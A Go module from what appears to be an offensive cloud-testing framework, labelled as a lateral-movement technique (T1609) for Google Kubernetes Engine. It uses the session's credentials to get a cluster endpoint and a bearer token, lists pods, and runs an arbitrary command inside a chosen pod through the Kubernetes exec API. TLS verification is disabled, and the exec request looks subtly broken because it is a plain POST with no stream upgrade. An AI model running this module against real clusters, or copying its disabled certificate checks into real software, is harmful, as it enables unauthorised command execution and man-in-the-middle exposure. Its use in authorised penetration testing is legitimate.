package gke

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"

	container "google.golang.org/api/container/v1"

	"github.com/user/nimbus/internal/module"
	"github.com/user/nimbus/internal/output"
)

func init() {
	module.Register(&ExecPod{})
}

// ExecPod lists pods in a GKE cluster and executes a command in a specified pod.
type ExecPod struct{}

func (m *ExecPod) Info() module.Info {
	return module.Info{
		Name:         "lateral.gke.exec-pod",
		Tactic:       module.TacticLateral,
		Service:      "gke",
		Description:  "List pods in a GKE cluster and exec into a specified pod",
		RequiresAuth: true,
		AttackID:     "T1609",
	}
}

// podListResponse is the minimal structure for the Kubernetes pod list API response.
type podListResponse struct {
	Items []podItem `json:"items"`
}

type podItem struct {
	Metadata struct {
		Name      string `json:"name"`
		Namespace string `json:"namespace"`
	} `json:"metadata"`
	Status struct {
		Phase string `json:"phase"`
	} `json:"status"`
}

func (m *ExecPod) Run(ctx module.RunContext) error {
	cluster := ctx.Flags["cluster"]
	zone := ctx.Flags["zone"]
	namespace := ctx.Flags["namespace"]
	pod := ctx.Flags["pod"]
	command := ctx.Flags["command"]

	if cluster == "" || zone == "" {
		output.Warn("Usage: run lateral.gke.exec-pod --cluster <name> --zone <zone> [--namespace <ns>] [--pod <name>] [--command <cmd>]")
		output.Info("Example: --cluster my-cluster --zone us-central1-a --pod nginx-abc123 --command id")
		return nil
	}

	if namespace == "" {
		namespace = "default"
	}
	if command == "" {
		command = "id"
	}

	project := ""
	if len(ctx.Projects) > 0 {
		project = ctx.Projects[0]
	}
	if project == "" {
		if projects := module.EnsureProjects(&ctx); len(projects) > 0 {
			project = projects[0]
		}
	}
	if project == "" {
		output.Warn("No project specified.")
		return nil
	}

	// Get cluster credentials via the GKE API.
	svc, err := container.NewService(context.Background(), ctx.Session.ClientOption())
	if err != nil {
		return fmt.Errorf("create container client: %w", err)
	}

	clusterPath := fmt.Sprintf("projects/%s/locations/%s/clusters/%s", project, zone, cluster)
	output.Info("Fetching cluster credentials: %s", clusterPath)

	clusterInfo, err := svc.Projects.Locations.Clusters.Get(clusterPath).Do()
	if err != nil {
		return fmt.Errorf("get cluster: %w", err)
	}

	endpoint := clusterInfo.Endpoint
	if endpoint == "" {
		return fmt.Errorf("cluster %s has no endpoint", cluster)
	}

	output.Success("Cluster endpoint: %s", endpoint)

	// Obtain a Bearer token from the session credentials.
	creds := ctx.Session.TokenSource()
	if creds == nil {
		return fmt.Errorf("no credentials available for Bearer token")
	}
	token, err := creds.TokenSource.Token()
	if err != nil {
		return fmt.Errorf("get access token: %w", err)
	}

	// Build an HTTP client that skips TLS verification for the K8s API
	// (the cluster CA would need to be configured for proper verification).
	httpClient := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	baseURL := fmt.Sprintf("https://%s", endpoint)

	// If no pod specified, list pods first.
	if pod == "" {
		output.Info("No --pod specified, listing pods in namespace %s ...", namespace)

		listURL := fmt.Sprintf("%s/api/v1/namespaces/%s/pods", baseURL, namespace)
		pods, err := k8sGet(httpClient, listURL, token.AccessToken)
		if err != nil {
			return fmt.Errorf("list pods: %w", err)
		}

		var podList podListResponse
		if err := json.Unmarshal(pods, &podList); err != nil {
			return fmt.Errorf("parse pod list: %w", err)
		}

		if len(podList.Items) == 0 {
			output.Info("No pods found in namespace %s", namespace)
			return nil
		}

		headers := []string{"POD", "NAMESPACE", "STATUS"}
		var rows [][]string
		for _, p := range podList.Items {
			rows = append(rows, []string{p.Metadata.Name, p.Metadata.Namespace, p.Status.Phase})
		}
		output.Success("Found %d pods in namespace %s", len(podList.Items), namespace)
		output.Table(headers, rows)
		output.Info("Re-run with --pod <name> to exec into a specific pod.")
		return nil
	}

	// Execute command in the specified pod.
	output.Warn("Executing command in pod %s/%s: %s", namespace, pod, command)

	params := url.Values{}
	params.Set("command", command)
	params.Set("stdout", "true")
	params.Set("stderr", "true")

	execURL := fmt.Sprintf("%s/api/v1/namespaces/%s/pods/%s/exec?%s",
		baseURL, namespace, pod, params.Encode())

	req, err := http.NewRequest("POST", execURL, nil)
	if err != nil {
		return fmt.Errorf("create exec request: %w", err)
	}
	req.Header.Set("Authorization", "Bearer "+token.AccessToken)

	resp, err := httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("exec request: %w", err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)

	if resp.StatusCode >= 400 {
		output.Error("Exec failed (HTTP %d): %s", resp.StatusCode, string(body))
		return fmt.Errorf("exec failed with status %d", resp.StatusCode)
	}

	output.Success("Exec output:\n%s", string(body))

	if ctx.Findings != nil {
		ctx.Findings <- module.Finding{
			Module:      "lateral.gke.exec-pod",
			Severity:    module.SevHigh,
			Title:       "Executed command in GKE pod",
			Description: fmt.Sprintf("Executed '%s' in pod %s/%s on cluster %s (project %s)", command, namespace, pod, cluster, project),
			Resource:    fmt.Sprintf("%s/%s", namespace, pod),
			Project:     project,
			Data: map[string]any{
				"cluster":   cluster,
				"zone":      zone,
				"namespace": namespace,
				"pod":       pod,
				"command":   command,
				"endpoint":  endpoint,
				"output":    string(body),
			},
		}
	}

	return nil
}

// k8sGet performs a GET request against the Kubernetes API with a Bearer token.
func k8sGet(client *http.Client, url, token string) ([]byte, error) {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Authorization", "Bearer "+token)

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	if resp.StatusCode >= 400 {
		return nil, fmt.Errorf("HTTP %d: %s", resp.StatusCode, string(body))
	}

	return body, nil
}
